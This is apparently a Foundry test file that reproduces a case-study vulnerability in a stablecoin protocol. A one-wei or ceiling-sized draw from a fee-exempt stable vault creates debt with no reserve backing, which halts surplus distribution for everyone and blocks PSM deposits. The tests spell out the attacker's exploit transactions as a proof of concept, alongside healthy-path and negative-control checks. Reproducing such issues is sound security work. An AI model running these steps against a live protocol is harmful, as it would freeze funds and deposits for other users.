// SPDX-License-Identifier: MIT
pragma solidity 0.8.24;

import {Test} from "forge-std/Test.sol";
import {BalanceSheet} from "src/BalanceSheet.sol";
import {PegStabilityModule} from "src/PSM.sol";
import {Stablecoin} from "src/mocks/Stablecoin.sol";
import {VaultEngine} from "src/VaultEngine.sol";

/// RAINUSDR-1622, reduced to the four behaviours the case study lists.
///
/// A vault opened on a fee-exempt stable collateral type draws USDR 1:1 and
/// its debt has no reserve counterpart, so BalanceSheet.distributeSurplus
/// reverts for everyone and PSM deposits hit the ceiling.
///
/// No fork, no RPC and no cheatcode that writes protocol state: every test
/// drives the contracts as the case study says the harness did. The attacker
/// is an ordinary account created with makeAddr, and every exploit step is the
/// attacker's own transaction.
contract ShadowVaultTest is Test {
    VaultEngine internal vault;
    BalanceSheet internal sheet;
    PegStabilityModule internal psm;
    Stablecoin internal usdt;

    address internal alice;
    address internal bob;

    bytes32 internal constant USDT_A = keccak256("USDT-A");
    uint256 internal constant CEILING = 1_000_000e6;
    /// The surplus a healthy system has to distribute.
    uint256 internal constant SURPLUS = 100e18;
    /// One wei of shadow debt is enough to halt the distribution.
    uint256 internal constant ONE_WEI = 1;

    function setUp() public {
        alice = makeAddr("alice");
        bob = makeAddr("bob");

        usdt = new Stablecoin("Tether USD", "USDT", 6);
        sheet = new BalanceSheet();
        vault = new VaultEngine(address(sheet));
        psm = new PegStabilityModule(address(usdt), address(sheet), CEILING);

        sheet.setModules(address(vault), address(psm));
        /// The fee-exempt stable type, initialised as the deployment does.
        vault.initIlk(USDT_A, true, false, 10_000_000e18);
        /// The stablecoins a keeper bought with the surplus.
        sheet.addReserve(SURPLUS);

        usdt.mint(alice, 1_000_000e6);
        usdt.mint(bob, 1_000_000e6);
    }

    /// A healthy distribution ships the surplus.
    function test_healthyDistribution_shipsSurplus() public {
        uint256 before = sheet.reserve();
        uint256 shipped = sheet.distributeSurplus();
        uint256 left = sheet.reserve();

        assertEq(shipped, SURPLUS);
        assertEq(left, before - shipped);
    }

    /// The same setup with no shadow vault: distribution runs and then has
    /// nothing to ship. This is the negative control for the revert below.
    function test_negativeControl_distributesWithoutShadowVault() public {
        uint256 first = sheet.distributeSurplus();
        uint256 second = sheet.distributeSurplus();
        uint256 left = sheet.reserve();

        assertEq(first, SURPLUS);
        assertEq(second, 0);
        assertEq(left, 0);
    }

    /// One wei of shadow debt makes every distributeSurplus call revert, and
    /// the position is capital-neutral: the USDR drawn equals the USDT locked,
    /// so there is no reason to ever repay.
    function test_shadowDrawBlocksDistribution() public {
        sheet.distributeSurplus();

        vm.startPrank(alice);
        vault.open(USDT_A, alice);
        usdt.approve(address(vault), ONE_WEI);
        vault.join(alice, ONE_WEI);
        vault.frob(USDT_A, ONE_WEI, ONE_WEI);
        uint256 drawn = vault.drawn(alice);
        vm.stopPrank();

        uint256 locked = vault.locked(alice, USDT_A);

        vm.prank(bob);
        vm.expectRevert(BalanceSheet.ReserveBackingShortfall.selector);
        sheet.distributeSurplus();

        assertEq(drawn, locked);
    }

    /// Drawn to the debt ceiling, PSM deposits revert for every later
    /// depositor.
    function test_psmDepositBlocked() public {
        vm.startPrank(alice);
        vault.open(USDT_A, alice);
        usdt.approve(address(vault), CEILING);
        vault.join(alice, CEILING);
        vault.frob(USDT_A, CEILING, CEILING);
        uint256 drawn = vault.drawn(alice);
        vm.stopPrank();

        uint256 locked = vault.locked(alice, USDT_A);

        vm.startPrank(bob);
        usdt.approve(address(psm), 1_000e6);
        vm.expectRevert(PegStabilityModule.CeilingExceeded.selector);
        psm.sellStable(address(bob), 1_000e6);
        vm.stopPrank();

        assertEq(drawn, locked);
    }
}
